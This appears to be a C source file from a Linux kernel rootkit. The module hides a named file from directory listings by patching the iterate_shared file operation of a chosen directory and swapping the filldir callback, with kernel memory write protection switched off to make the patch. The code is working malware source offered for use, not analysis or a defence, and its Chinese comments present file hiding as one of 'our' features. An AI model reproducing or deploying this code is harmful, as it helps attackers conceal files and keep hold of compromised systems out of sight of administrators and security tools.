#include "../header/hide.h"

// 文件隐藏所需参数
char* hide_path = "default";
char* file_name = "default";
module_param(hide_path, charp, 0000);
MODULE_PARM_DESC(hide_path, "the path of dirent for file hide.");
module_param(file_name, charp, 0000);
MODULE_PARM_DESC(file_name, "the file name to hide.");

// 文件隐藏：
// 根据输入的hide_path隐藏相应的文件，以完善我们的功能。

int (*real_iterate)(struct file *filp, struct dir_context *ctx);

int (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    if (strcmp(name, file_name) == 0) {
        printk(KERN_INFO "Hiding: %s\n", name);
        return 0;
    }

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

int fake_iterate(struct file *filp, struct dir_context *ctx) {
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


void hook_iterate(void) {                       
    struct file *filp;                                  
    struct file_operations *f_op;    

    if (strcmp("default", hide_path) == 0) {
        return;
    }
                    
    printk(KERN_INFO "Opening the path: %s.\n", hide_path);          
    filp = filp_open(hide_path, O_RDONLY, 0);                
    
    if (filp == NULL) return;              
    
    f_op = (struct file_operations *)filp->f_op;    
    real_iterate = f_op->iterate_shared;                              
                                                    
    unprotect_memory();                     
    f_op->iterate_shared = fake_iterate;               
    protect_memory();
    filp_close(filp, NULL);     
}

void hook_cleanup(void) {
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                      
    if (strcmp("default", hide_path) == 0) {
        return;
    }                 
    printk(KERN_INFO "Opening the path: %s.\n", hide_path);          
    filp = filp_open(hide_path, O_RDONLY, 0);                
    
    if (filp == NULL) return;                                     
    f_op = (struct file_operations *)filp->f_op;    
                            
    unprotect_memory();                     
    f_op->iterate_shared = real_iterate;               
    protect_memory();            
    filp_close(filp, NULL);    
}

void hide_file(void) {
    hook_iterate();
}

void hide_file_cleanup(void) {
    hook_cleanup();
}